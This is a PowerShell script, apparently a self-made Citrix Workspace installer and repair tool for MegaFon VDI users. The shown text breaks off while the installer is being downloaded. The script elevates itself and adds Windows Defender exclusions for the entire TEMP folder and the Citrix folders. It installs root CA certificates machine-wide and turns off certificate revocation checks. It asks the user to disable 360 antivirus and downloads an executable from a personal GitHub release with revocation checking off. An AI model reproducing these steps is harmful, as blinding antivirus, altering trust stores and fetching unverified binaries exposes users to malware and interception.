# =========================================================================
# CITRIX WORKSPACE WEB INSTALLER & REPAIR (MEGAFON VDI)
# Репозиторий: https://github.com/Maximka-L/citrix-vdi
# =========================================================================

# Самоповышение прав администратора (UAC)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Запрос прав Администратора..." -ForegroundColor Yellow
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$((Get-Item (Get-PSCallStack)[0].InvocationInfo.PSCommandPath).FullName)`"" -Verb RunAs
    exit
}

try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch {}
Clear-Host

Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "   CITRIX WORKSPACE ALL-IN-ONE WEB INSTALLER (MEGAFON VDI)       " -ForegroundColor Cyan
Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host ""

$DownloadUrl = "https://github.com/Maximka-L/citrix-vdi/releases/download/v1.0/CitrixWorkspaceFullInstaller.exe"
$TargetVersionStr = "2402 LTSR CU1 (24.2.4000.x / 24.2.4001.x)"
$TempInstallerPath = Join-Path $env:TEMP "CitrixWorkspaceFullInstaller.exe"

# Временное добавление исключений в Защитник Windows (Defender)
try {
    Add-MpPreference -ExclusionProcess "CitrixWorkspaceFullInstaller.exe", "TrolleyExpress.exe", "wfica32.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP", "${env:ProgramFiles(x86)}\Citrix", "${env:ProgramFiles}\Citrix" -ErrorAction SilentlyContinue
} catch {}

# -------------------------------------------------------------------------
# ЭТАП 1: УСТАНОВКА СЕРТИФИКАТОВ (Минцифры РФ + Sectigo AAA) И СБРОС КЭШЕЙ
# -------------------------------------------------------------------------
Write-Host "[1/6] Установка доверенных корневых сертификатов..." -ForegroundColor Yellow

$certs = @(
    @{ Name = "Минцифры РФ (Корневой)"; Store = "Root"; B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tDQpNSUlGd2pDQ0E2cWdBd0lCQWdJQ0VBQXdEUVlKS29aSWh2Y05BUUVMQlFBd2NERUxNQWtHQTFVRUJoTUNVbFV4DQpQekE5QmdOVkJBb01ObFJvWlNCTmFXNXBjM1J5ZVNCdlppQkVhV2RwZEdGc0lFUmxkbVZzYjNCdFpXNTBJR0Z1DQpaQ0JEYjIxdGRXNXBZMkYwYVc5dWN6RWdNQjRHQTFVRUF3d1hVblZ6YzJsaGJpQlVjblZ6ZEdWa0lGSnZiM1FnDQpRMEV3SGhjTk1qSXdNekF4TWpFd05ERTFXaGNOTXpJd01qSTNNakV3TkRFMVdqQndNUXN3Q1FZRFZRUUdFd0pTDQpWVEUvTUQwR0ExVUVDZ3cyVkdobElFMXBibWx6ZEhKNUlHOW1JRVJwWjJsMFlXd2dSR1YyWld4dmNHMWxiblFnDQpZVzVrSUVOdmJXMTFibWxqWVhScGIyNXpNU0F3SGdZRFZRUUREQmRTZFhOemFXRnVJRlJ5ZFhOMFpXUWdVbTl2DQpkQ0JEUVRDQ0FpSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnSVBBRENDQWdvQ2dnSUJBTWZGT1o4cFVBTDMrcjJuDQpxcUUwWnA1MnNlbFhzS0dGWW9HMEdNNWJ3ejFiU0Z0Q3QrQVpRTWhrV1FoZUkzcG9aQVRvWUp1NjlwSExLUzZRDQpYQml3QkMxY3Z6WW1VWUtNWVpDN2pFNVloRVUyYlNMMG1YN05hTXhNRG1IMi9Od3VPVlJqOE9JbVZhNXMxRjRVDQp6bjRLdjNQRmxEQmpqU2pYS1ZZOWttalVCc1hRcklIZWFxbVVJc1BJbE5XVW5pbVhTMEkwYWJFeHFrYmRyWGJYDQpZd0NPWGhPTzJwRFV4M2NrbUpsQ01VR2FjVVRueWx5UVcyVnNKSXlJR0E4VjB4emRhZVVYZzBWWjZabU5VcjVZDQpCZXIvRUFPTFBiOE5ZcHNBaEplMm1Yak1CL0o5SE5zb0ZNQkZKMGxMT1QvK2RRdmpiZFJab09UOGVxSnBXblZEDQpVK1FML3FFWm56NTdOODhPV00zcmFiSmtSTmRVL1o3eDVTRklNOUZycXROOHhld3NpQldCSTBLNlhGdU9CT1REDQo0VjA4bzRUeko4K0NjcTVYbENVVzJMNDhwWk5DWXVCRGZCaDdGeGtCN3FEZ0dEaWFmdEVrWlpmQXBSZzJFK005DQpHOHdrTktUUExEYzR3SDBGRFRpamhneFIzWTRQaVMxSEwyWmh3N2JEM0Nic2xtRUdnZm5uWm9qTmtKdGNMZUJIDQpCTGE1Mi9kU3dOVTRXV0x1YmFZU2lBbUE5SVVNWDEvUnBmcHhPeGQ0WWttaHo5N29GYlVhREpGaXBJZ2d4NXNYDQplUEFsa1RkV252K1JXQnhsSndNUTI1b0VIbVJndU5ZZjRaci9SeHI5Y1M5M1krbWRYSVphQkVFMEtTMmlMUnFhDQpPaVdCa2k5SU1RVTRwaHFQT0JBYUc3QStlUDhQQWdNQkFBR2paakJrTUIwR0ExVWREZ1FXQkJUaDBZSGx6bHBmDQpCS3JTNmJhZFpySEYrcXdzaHpBZkJnTlZIU01FR0RBV2dCVGgwWUhsemxwZkJLclM2YmFkWnJIRitxd3NoekFTDQpCZ05WSFJNQkFmOEVDREFHQVFIL0FnRUVNQTRHQTFVZER3RUIvd1FFQXdJQmhqQU5CZ2txaGtpRzl3MEJBUXNGDQpBQU9DQWdFQUFMSVkxd2tpbHQvdXJmRVZNNXZLenI2dXRPZURXQ1Vjem1XWC9SWDRsanBSZGdGKzVmQUlTNHZIDQp0bVhrcXBTQ09WZVdVckpWOVF2Wm42TDIyN1p3dUUxNWNXaThEQ0RhbDNVZTkwV2dBSkpaTWZUc2hONE9JOGNxDQpXOUU0RUc5d2dsYkV0TW5PYkhsbXM4RjNDSG1ydzNrNkttVWtXR29hKy9FTm1jVmw2OHUvY01SbDFKYlcyYk0rDQovM0ErU0FnMmM2aVBEbGVoY3pLeDJvYTk1UVcwU2tQUFdHdU5BL0NFOENweUFOSWh1OVhGcmozUlEzRXFlUmNTDQpBUVFvZDFSTnVIcGZFVExVL0EyZ01tdm4vdy9zeDdUQjNXNUJQczZycHJPQTM3dHV0UHE5dTZGVFpPY0cxT3FqDQpDL0I3eVRxZ0k3cmJ5dm94N0RFWG9YN3JJaUVxeU5OVWd1VGsvdTNTWjRWWEUya214ZG1TaDNUUXZ5YmZiblhWDQo0SmJDWlZhcWlacmFxYzdvWk1uUm9XclhSRzN6dGJuYmVzLzlxaFJHSTdQcVhxZUtKQnp0eFJURVZqOE9OczFkDQpXTjVzelR3YVBJdmhraE8zQ081RXJVMnJWZFVyODl3S3BOWGJCT0RGS1J0Z3hVVDcwWXBtSjQ2VlZhcWRBaE9aDQpEOUVVVW40WWFlTGFTOEFqU0YvaDdVa2pPaWJOYzRxVkRpUFArcmtlaEZXTTY2UFZuUDFNc2g5M3RjK3RhSWZDDQpFWVZNeGpoOHpOYkZ1b2M3Znp2dnJGSUxMZTdpZnZFSVVxU1ZJQy9BenBsTS9KeHc3YnVYRmVHUDFxVkNCRUhxDQozOTFkLzlSQWZhWjEyemt3RnNsK0lLd0UvT1p4VzhBSGE5aTFwNEdPMFlTTnVjenpFbTQ9DQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tDQo=" },
    @{ Name = "Минцифры РФ (Выпускающий)"; Store = "CA"; B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tDQpNSUlIUWpDQ0JTcWdBd0lCQWdJQ0VBSXdEUVlKS29aSWh2Y05BUUVMQlFBd2NERUxNQWtHQTFVRUJoTUNVbFV4DQpQekE5QmdOVkJBb01ObFJvWlNCTmFXNXBjM1J5ZVNCdlppQkVhV2RwZEdGc0lFUmxkbVZzYjNCdFpXNTBJR0Z1DQpaQ0JEYjIxdGRXNXBZMkYwYVc5dWN6RWdNQjRHQTFVRUF3d1hVblZ6YzJsaGJpQlVjblZ6ZEdWa0lGSnZiM1FnDQpRMEV3SGhjTk1qSXdNekF5TVRFeU5URTVXaGNOTWpjd016QTJNVEV5TlRFNVdqQnZNUXN3Q1FZRFZRUUdFd0pTDQpWVEUvTUQwR0ExVUVDZ3cyVkdobElFMXBibWx6ZEhKNUlHOW1JRVJwWjJsMFlXd2dSR1YyWld4dmNHMWxiblFnDQpZVzVrSUVOdmJXMTFibWxqWVhScGIyNXpNUjh3SFFZRFZRUUREQlpTZFhOemFXRnVJRlJ5ZFhOMFpXUWdVM1ZpDQpJRU5CTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUE5WVBxQktPazE5TkZ5bXJFDQp3ZWh6cmhCRWdUMmF0TGV6cGR1QjI0bVE3Q2lPYS9IVnBGQ0RSWnpkeHFsaDhkcmt1NDA4L3RUbVd6bE5IL2JyDQpIdVFoWi9taVdLT2YzNWxwS3pqeUJkNlRQTTIzdUFmSnZFT1EyL2RuS0dHSmJzVW8xL3VkS1N2eFF3VkhwVnYzDQpTODBPbGx1S2ZoV1BERVhRcGd5RnFJelBveElRVExaMGRlaXJad01WSGFyWjV1OEhxSGV0UnVBdG1PMlpER1FuDQp2Vk9KWUFqbHMrSGl1ZXE3TGo3T2NlN0NRc1R3VlplUCtYUXgyOFBBYUVaM3k2c1FFdDZyTDA2ZGRwU2RvVE1wDQpCbkNxVGJ4VytlV015amtJbjZ0OUdCdFVWNDV5QjFFa0hObmoyRXg0R3dDaU45VDg0UVFqS1NyKzhmMHBzR3JaDQp2UGJDYlFBd05GSmppc0xpeG5qbEdQTEthNXZPbU53SWgvTEF5VVc1RGpwa0N4MDA0TFBEdXFQcEZzS1hOS3BhDQpMMkRtNnVjMHg0Sm81bStnVVRWT1JCNmhPU3pXbldEajJHV2ZvbUx6enlqRzgxRFJHRkJwY28vTzkzemVjc0lODQozU0wyWXNqcHExemRvUzAxQ01ZeGllLy85eld2WXd6STI1L09aaWd0bnBDSXJjZDJqMVk2ZE1VRlFBekF0SEUrDQpxc1hmbFNMOEhJUytJSkVGSVFvYkxsWWhIa29FM2F2Z054NWpsdStPTFllMGRGMFlreDFQR05qYndxdlRYMzdSDQpDbjMyTk1qbG90VzJRY0dFWmhES2orM3VyWml6cDV4ZFRQWml0QSthRWpaTS9OaTcxVk9kaU9QMGlnYnc2YXNaDQoyZnhkb3paMVRuU1NZTll2TkFUd3RoTm1aeXNDQXdFQUFhT0NBZVV3Z2dIaE1CSUdBMVVkRXdFQi93UUlNQVlCDQpBZjhDQVFBd0RnWURWUjBQQVFIL0JBUURBZ0dHTUIwR0ExVWREZ1FXQkJUUjRYRU5DeTJCVG02S1NvOU1JN05NDQpYcXRwQ3pBZkJnTlZIU01FR0RBV2dCVGgwWUhsemxwZkJLclM2YmFkWnJIRitxd3NoekNCeHdZSUt3WUJCUVVIDQpBUUVFZ2Jvd2diY3dPd1lJS3dZQkJRVUhNQUtHTDJoMGRIQTZMeTl5YjNOMFpXeGxZMjl0TG5KMUwyTmtjQzl5DQpiMjkwWTJGZmMzTnNYM0p6WVRJd01qSXVZM0owTURzR0NDc0dBUVVGQnpBQ2hpOW9kSFJ3T2k4dlkyOXRjR0Z1DQplUzV5ZEM1eWRTOWpaSEF2Y205dmRHTmhYM056YkY5eWMyRXlNREl5TG1OeWREQTdCZ2dyQmdFRkJRY3dBb1l2DQphSFIwY0RvdkwzSmxaWE4wY2kxd2Eya3VjblV2WTJSd0wzSnZiM1JqWVY5emMyeGZjbk5oTWpBeU1pNWpjblF3DQpnYkFHQTFVZEh3U0JxRENCcFRBMW9ET2dNWVl2YUhSMGNEb3ZMM0p2YzNSbGJHVmpiMjB1Y25VdlkyUndMM0p2DQpiM1JqWVY5emMyeGZjbk5oTWpBeU1pNWpjbXd3TmFBem9ER0dMMmgwZEhBNkx5OWpiMjF3WVc1NUxuSjBMbkoxDQpMMk5rY0M5eWIyOTBZMkZmYzNOc1gzSnpZVEl3TWpJdVkzSnNNRFdnTTZBeGhpOW9kSFJ3T2k4dmNtVmxjM1J5DQpMWEJyYVM1eWRTOWpaSEF2Y205dmRHTmhYM056YkY5eWMyRXlNREl5TG1OeWJEQU5CZ2txaGtpRzl3MEJBUXNGDQpBQU9DQWdFQVJCVnpabHM3OUFkaVNDcGFyMTVkQTVIci9yclQ0V2JyT2Z6bHBJK3hyTGVSUHJVRzZlVVdJVzR2DQpTdWkxeXgzaXFHTENqUGNLYitIT1R3b1JNYkk2eXRQL25kcDNUbFl1YTJhZHZZQkVoU3Zqcys0dkRaTndYci9EDQphbmJ3SVdkdXJabVZpUVJCREZlYnBrdm5JdnJ1L1JwV3VkLzVyNjI0V3A4dm9aTVJ0ai9jbTZhSTlMdHZCZlQ5DQpjZnpoT2FleEkvOTljMTRkeWl1azErNlFoZHdLYUNSVGMxbWRmTlFtbmZXTlJiZldoV0JsSzNoNEdHRTlKSzMzDQpHazhaUzhETXJrZEFoMHhieTR4QVEvbVNXQWZXckJtZnpsT3FHeW9CMVU0N1dUT2VxTmJXa2tvQVAyeXM5NCtzDQpKZzROVGtpRFZ0WFJGNm5yNmZZaTBiU092T0ZnMElRck1YTzJZOGd5ZzlBUmRQSndLdHZXWDhWUEFEQ1lNaVdIDQpoNG44Ylpva0lySW1WS0xEUUtIWTRqQ3NORDJISGRKZm5yZEwyWUp3MXFGc2tOTzRjU05tWnlkdzBXa2dqdjlrDQpGK0t4cXJES2xCOE1adTJIY2xwaDZ2L0NaMGZROVl1RTgvbHNIWjBRYzJIeWlTTW52amdLNWZEYzNURDRmYThGDQpFOGdNTnVyTStrVjhQVDhMTklNKzRacytMS0VWOG5xUldCYXhrSVZKR2Vra1ZLTzh4REJPRy9hTjYyQVpLSE9lDQpHY3lJZHU3eU5NTVJpaEdWWkNZcjhyWWlKb0tpT3pEcU9rUGtMT1BkaHRWbGduaG93ekhEeE1ITkQvRTJXQTVwDQpaSHVOTS9tMFRYdDJ3VFRQTDdKSDJZQzBnUHovQnZ2U3pqa3NnelU1ckxiUnlVS1FrZ1U9DQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tDQo=" },
    @{ Name = "Sectigo AAA Certificate Services"; Store = "Root"; B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tDQpNSUlFTWpDQ0F4cWdBd0lCQWdJQkFUQU5CZ2txaGtpRzl3MEJBUVVGQURCN01Rc3dDUVlEVlFRR0V3SkhRakViDQpNQmtHQTFVRUNBd1NSM0psWVhSbGNpQk5ZVzVqYUdWemRHVnlNUkF3RGdZRFZRUUhEQWRUWVd4bWIzSmtNUm93DQpHQVlEVlFRS0RCRkRiMjF2Wkc4Z1EwRWdUR2x0YVhSbFpERWhNQjhHQTFVRUF3d1lRVUZCSUVObGNuUnBabWxqDQpZWFJsSUZObGNuWnBZMlZ6TUI0WERUQTBNREV3TVRBd01EQXdNRm9YRFRJNE1USXpNVEl6TlRrMU9Wb3dlekVMDQpNQWtHQTFVRUJoTUNSMEl4R3pBWkJnTlZCQWdNRWtkeVpXRjBaWElnVFdGdVkyaGxjM1JsY2pFUU1BNEdBMVVFDQpCd3dIVTJGc1ptOXlaREVhTUJnR0ExVUVDZ3dSUTI5dGIyUnZJRU5CSUV4cGJXbDBaV1F4SVRBZkJnTlZCQU1NDQpHRUZCUVNCRFpYSjBhV1pwWTJGMFpTQlRaWEoyYVdObGN6Q0NBU0l3RFFZSktvWklodmNOQVFFQkJRQURnZ0VQDQpBRENDQVFvQ2dnRUJBTDVBbmZSdTRlcDJoeHhOUlVTT3ZrYklnd2Fkd1NyK0dCK081QUw2ODZ0ZFVJb1dNUXVhDQpCdERGY0NMTlNTMVVZOHkyYm1oR0MxUHF5MHdrd0x4eVR1cnhGYTcwVkpvU0NzTjZzak5nNHRxSlZmTWlXUFBlDQozTS92ZzRhaWpKUlBuMmp5bUpCR2hDZkhkci9qekRVc2kxNEhaR1dDd0Vpd3FKSDVZWjkySUZDb2tjZG10ZXQ0DQpZZ05XOElvYUUrb3hveDZnbWYwNDl2WW5NbGh2Qi9WcnVQc1VLNiszcXN6V1kxOXpqTm9GbWFnNHFNc1hlRFpSDQpyT21lOUhnNmpjOFAyVUxpbUF5ckw1OE9BZDd2bjVsSjhTM2ZySFJORzVpMVI4WGxLZEg1a0JqSFlweStnOGNtDQplejZLSmNmQTNaM21OV2dRSUoyUDJON1N3NFNjRFY3b0w4a0NBd0VBQWFPQndEQ0J2VEFkQmdOVkhRNEVGZ1FVDQpvQkVLSXo2VzhRZnM0cThwNzRLbGY5QXdwTFF3RGdZRFZSMFBBUUgvQkFRREFnRUdNQThHQTFVZEV3RUIvd1FGDQpNQU1CQWY4d2V3WURWUjBmQkhRd2NqQTRvRGFnTklZeWFIUjBjRG92TDJOeWJDNWpiMjF2Wkc5allTNWpiMjB2DQpRVUZCUTJWeWRHbG1hV05oZEdWVFpYSjJhV05sY3k1amNtd3dOcUEwb0RLR01HaDBkSEE2THk5amNtd3VZMjl0DQpiMlJ2TG01bGRDOUJRVUZEWlhKMGFXWnBZMkYwWlZObGNuWnBZMlZ6TG1OeWJEQU5CZ2txaGtpRzl3MEJBUVVGDQpBQU9DQVFFQUNGYjhBdkNiNlArayt0Wjd4a1NBemsvRXhmWUFXTXltdHJ3VVNXZ0VkdWptN2wzc0FnOWcxbzFRDQpHRThtVGdIajVyQ2w3cis4ZEZSQnYvMzhFcmpIVDFyMGlXQUZmMkMzQlVyejl2SEN2OFM1ZElhMkxYMXJ6Tkx6DQpSdDB2eHVCcXc4TTBBeXg5bHQxYXdnNm5DcG5CQll1ckRDL3pYRHJQYkRkVkNZZmVVMEJzV08vOHRxdGxiZ1QyDQpHOXc4NEZvVnhwN1o4VmxJTUNGbEEyenM2U0Z6N0pzRG9lQTNyYUFWR0kvNnVnTE9weXlwRUJNczFPVUlKcXNpDQpsMkQ0a0Y1MDFLS2FVNzN5cVdqZ29tN0MxMnl4b3crZXYrdG81MWJ5cnZMakt6ZzZDWUcxYTRYWHZpM3RQeHEzDQpzbVBpOVdJc2d0UnFBRUZROFRtRG41WHBOcGFZYmc9PQ0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQ0K" }
)

foreach ($c in $certs) {
    try {
        $bytes = [System.Convert]::FromBase64String($c.B64)
        $certObj = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$bytes)
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store($c.Store, "LocalMachine")
        $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
        $store.Add($certObj)
        $store.Close()
        Write-Host "   [OK] $($c.Name) установлен в хранилище $($c.Store)." -ForegroundColor Green
    } catch {
        Write-Host "   [!] Ошибка установки $($c.Name): $_" -ForegroundColor Red
    }
}

# Очистка кэшей отзыва (CRL/OCSP) и сброс DNS
Write-Host "[2/6] Сброс сетевых кэшей отзыва (CRL/OCSP) и DNS..." -ForegroundColor Yellow
certutil.exe -urlcache * delete >$null 2>&1
Clear-DnsClientCache -ErrorAction SilentlyContinue

# Настройка мягкой проверки отзыва (NoCheck)
$regPaths = @(
    "HKLM:\SOFTWARE\Citrix\ICA Client\Engine\Lockdown Profiles\All Regions\Lockdown\Security\Certificate Revocation Check",
    "HKLM:\SOFTWARE\WOW6432Node\Citrix\ICA Client\Engine\Lockdown Profiles\All Regions\Lockdown\Security\Certificate Revocation Check"
)
foreach ($rp in $regPaths) {
    if (-not (Test-Path $rp)) { New-Item -Path $rp -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $rp -Name "Certificate Revocation Check" -Value "NoCheck" -Force -ErrorAction SilentlyContinue
}
Write-Host "   [OK] Сертификаты настроены, мягкая проверка включена." -ForegroundColor Green

# -------------------------------------------------------------------------
# ЭТАП 2: НАСТРОЙКА ЗВУКА И ГАРНИТУРЫ (CITRIX HDX AUDIO)
# -------------------------------------------------------------------------
Write-Host "[3/6] Принудительная настройка звука и микрофона HDX Audio..." -ForegroundColor Yellow
$audioPaths = @(
    "HKLM:\SOFTWARE\Citrix\ICA Client\Engine\Configuration\Advanced\Modules\Audio",
    "HKLM:\SOFTWARE\WOW6432Node\Citrix\ICA Client\Engine\Configuration\Advanced\Modules\Audio"
)
foreach ($ap in $audioPaths) {
    if (-not (Test-Path $ap)) { New-Item -Path $ap -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $ap -Name "AudioBandwidthLimit" -Value 0 -Force -ErrorAction SilentlyContinue
}
$clientAudioPaths = @(
    "HKLM:\SOFTWARE\Citrix\ICA Client\Engine\Configuration\Advanced\Modules\ClientAudio",
    "HKLM:\SOFTWARE\WOW6432Node\Citrix\ICA Client\Engine\Configuration\Advanced\Modules\ClientAudio"
)
foreach ($cap in $clientAudioPaths) {
    if (-not (Test-Path $cap)) { New-Item -Path $cap -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $cap -Name "Audio" -Value "On" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $cap -Name "EnableAudioInput" -Value 1 -Force -ErrorAction SilentlyContinue
}
Write-Host "   [OK] Параметры аудио и микрофона зафиксированы." -ForegroundColor Green

# -------------------------------------------------------------------------
# ЭТАП 3: ПРОВЕРКА ТЕКУЩЕЙ ВЕРСИИ CITRIX WORKSPACE
# -------------------------------------------------------------------------
Write-Host "[4/6] Проверка версии Citrix Workspace..." -ForegroundColor Yellow

function Convert-ToVersionObject ([string]$verStr) {
    try {
        $cleaned = ($verStr -replace '[^\d\.]', '').Trim('.')
        $parts = $cleaned.Split('.') | Select-Object -First 4
        while ($parts.Count -lt 2) { $parts += "0" }
        return [version]($parts -join '.')
    } catch { return $null }
}

function Get-CitrixApp {
    $paths = @(
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    return (Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | 
            Where-Object { $_.DisplayName -match "Citrix Workspace" -and $_.DisplayVersion } | 
            Select-Object -First 1)
}

$citrixApp = Get-CitrixApp
$installedVersion = if ($citrixApp) { $citrixApp.DisplayVersion } else { $null }
if (-not $installedVersion) {
    @("${env:ProgramFiles(x86)}\Citrix\ICA Client\wfica32.exe", "${env:ProgramFiles}\Citrix\ICA Client\wfica32.exe") | ForEach-Object {
        if (Test-Path $_) { $installedVersion = (Get-Item $_).VersionInfo.ProductVersion }
    }
}

$reqVer = Convert-ToVersionObject $TargetVersionStr
$needsInstall = $false

if ($ForceReinstall -or $env:FORCE_CITRIX_REINSTALL -eq "1") {
    Write-Host "   [РЕЖИМ ПРИНУДИТЕЛЬНОЙ ПЕРЕУСТАНОВКИ]" -ForegroundColor Yellow
    Write-Host "   -> Полная очистка и переустановка Citrix будут выполнены принудительно!" -ForegroundColor Yellow
    $needsInstall = $true
} elseif ($installedVersion) {
    Write-Host "   Текущая версия Citrix        : $installedVersion" -ForegroundColor White
    Write-Host "   Эталонная версия для VDI     : $TargetVersionStr" -ForegroundColor White

    $instVer = Convert-ToVersionObject $installedVersion
    $isMatch = ($installedVersion -like "24.2.4000*") -or ($installedVersion -like "24.2.4001*") -or ($instVer -and $instVer.Major -eq 24 -and $instVer.Minor -eq 2 -and ($instVer.Build -ge 4000 -and $instVer.Build -le 4001))

    if ($isMatch) {
        Write-Host "   [АКТУАЛЬНА] Установлена эталонная версия ($installedVersion)." -ForegroundColor Green
        Write-Host "   Переустановка не требуется!" -ForegroundColor Green
    } else {
        Write-Host "   [НЕСООТВЕТСТВИЕ ВЕРСИИ] Обнаружена версия $installedVersion." -ForegroundColor Red
        Write-Host "   Для VDI МегаФона требуется линейка Citrix Workspace 2402 LTSR CU1 (24.2.4000.x / 24.2.4001.x)." -ForegroundColor Yellow
        Write-Host "   -> Запуск полной зачистки и установка эталонной версии..." -ForegroundColor Yellow
        $needsInstall = $true
    }
} else {
    Write-Host "   Citrix Workspace не установлен в системе." -ForegroundColor Yellow
    $needsInstall = $true
}

# -------------------------------------------------------------------------
# ЭТАП 4: СКАЧИВАНИЕ, ЧИСТКА И УСТАНОВКА
# -------------------------------------------------------------------------
if ($needsInstall) {
    # 1. Проверка 360 Total Security
    $av360 = Get-Process -Name "360tray", "360sd", "ZHPRTP", "ZhuDongFangYu", "360rp", "360Safe" -ErrorAction SilentlyContinue
    if ($av360) {
        Write-Host ""
        Write-Host "=================================================================" -ForegroundColor Yellow
        Write-Host " [ВНИМАНИЕ] ОБНАРУЖЕН АКТИВНЫЙ АНТИВИРУС 360 TOTAL SECURITY!" -ForegroundColor Red
        Write-Host " Проактивная защита 360 блокирует тихую установку драйверов Citrix" -ForegroundColor Yellow
        Write-Host " (ошибка 1603) и запрещает регистрацию компонентов в реестре." -ForegroundColor Yellow
        Write-Host ""
        Write-Host " ЧТО НЕОБХОДИМО СДЕЛАТЬ ПРЯМО СЕЙЧАС:" -ForegroundColor White
        Write-Host " 1. В правом нижнем углу экрана (в трее у часов) найдите значок 360." -ForegroundColor Cyan
        Write-Host " 2. Кликните правой кнопкой мыши -> выключите защиту (на 15 минут)." -ForegroundColor Cyan
        Write-Host " 3. Если во время установки появится окно 360 -> выберите 'РАЗРЕШИТЬ'." -ForegroundColor Green
        Write-Host "=================================================================" -ForegroundColor Yellow
        Write-Host ""
        Write-Host ">>> Приостановите защиту 360 в трее и нажмите ENTER для продолжения... " -ForegroundColor Yellow -NoNewline
        $null = Read-Host
        Write-Host "Продолжаем установку..." -ForegroundColor Gray
        Write-Host ""
    }

    # 2. Глубокая нативная чистка старой версии (ВЫПОЛНЯЕТСЯ ДО СКАЧИВАНИЯ НОВОЙ)
    if ($installedVersion) {
        Write-Host "[5/7] Глубокая очистка предыдущей версии ($installedVersion)..." -ForegroundColor Yellow
        Write-Host "   Остановка служб и процессов старого Citrix..." -ForegroundColor Gray
        Get-Service -Name "*Citrix*", "*Receiver*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
        $pList = @("wfica32", "receiver", "SelfService", "SelfServicePlugin", "wfcrun32", "concentr", "AuthManSvr", "CDViewer", "CitrixReceiverUpdater", "ctxworkspaceapp", "redirector", "ctxusbm")
        foreach ($procName in $pList) { Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }
        
        $app = Get-CitrixApp
        if ($app -and $app.UninstallString) {
            try {
                $u = $app.UninstallString
                if ($u -match '^"([^"]+)"(.*)$') { $exe = $matches[1]; $args = "$($matches[2]) /silent /cleanup /noreboot" }
                else { $parts = $u.Split(' ', 2); $exe = $parts[0]; $args = if ($parts.Length -gt 1) { "$($parts[1]) /silent /cleanup /noreboot" } else { "/silent /cleanup /noreboot" } }
                $null = Start-Process -FilePath $exe -ArgumentList $args -Wait -ErrorAction SilentlyContinue
            } catch {}
        }
        @("HKLM:\SOFTWARE\Citrix", "HKLM:\SOFTWARE\WOW6432Node\Citrix", "HKCU:\SOFTWARE\Citrix") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
        }
        @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall") | ForEach-Object {
            Get-ChildItem -Path $_ -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -match "Citrix" -or $_.PSChildName -match "Citrix" } | ForEach-Object { Remove-Item -Path $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue }
        }
        @("${env:ProgramFiles(x86)}\Citrix", "${env:ProgramFiles}\Citrix", "${env:ProgramData}\Citrix", "$env:LOCALAPPDATA\Citrix", "$env:APPDATA\Citrix", "$env:TEMP\Citrix*") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue }
        }
        Write-Host "   [OK] Предыдущая версия полностью зачищена." -ForegroundColor Green
    }

    # 3. Скачивание дистрибутива в защищенную изолированную папку
    $TargetFolder = Join-Path $env:TEMP "Citrix_VDI_Setup"
    if (-not (Test-Path $TargetFolder)) { New-Item -ItemType Directory -Path $TargetFolder -Force | Out-Null }
    $TempInstallerPath = Join-Path $TargetFolder "CitrixWorkspaceFullInstaller.exe"

    # Если файл уже скачан ранее и его размер корректен (> 500 МБ) - используем повторно
    $alreadyDownloaded = (Test-Path $TempInstallerPath) -and ((Get-Item $TempInstallerPath).Length -gt 500000000)

    if (-not $alreadyDownloaded) {
        Write-Host "[6/7] Загрузка эталонного дистрибутива Citrix с GitHub (~730 МБ)..." -ForegroundColor Yellow
        Write-Host "   URL: $DownloadUrl" -ForegroundColor Gray
        
        $downloadSuccess = $false
        try {
            if (Get-Command "curl.exe" -ErrorAction SilentlyContinue) {
                Write-Host "   Запуск загрузки через curl..." -ForegroundColor Gray
                & curl.exe --ssl-no-revoke -L -# "$DownloadUrl" -o "$TempInstallerPath"
                if ((Test-Path $TempInstallerPath) -and (Get-Item $TempInstallerPath).Length -gt 500000000) {
                    $downloadSuccess = $true
                }
            }
        } catch {}

        if (-not $downloadSuccess) {
            try {
                Write-Host "   Запуск загрузки через BITS / WebClient..." -ForegroundColor Gray
                $webclient = New-Object System.Net.WebClient
                $webclient.DownloadFile($DownloadUrl, $TempInstallerPath)
                if ((Test-Path $TempInstallerPath) -and (Get-Item $TempInstallerPath).Length -gt 500000000) {
                    $downloadSuccess = $true
                }
